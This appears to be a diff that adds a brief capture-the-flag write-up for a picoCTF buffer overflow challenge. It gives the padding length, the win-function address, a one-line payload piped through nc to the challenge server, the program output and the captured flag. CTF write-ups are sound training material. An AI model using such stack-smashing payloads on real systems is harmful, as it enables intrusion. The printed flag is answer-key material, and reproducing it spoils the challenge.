@@ -1,0 +1,7 @@
+A standard buffer overflow: We need to overflow 44 bytes of garbage then the address of the win function (0x80491f6)
+so that we can get the flag.
+
+$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*44 + b'\xf6\x91\x04\x08\n')" | nc saturn.picoctf.net 63218
+Please enter your string:
+Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
+picoCTF{addr3ss3s_ar3_3asy_ad2f467b}
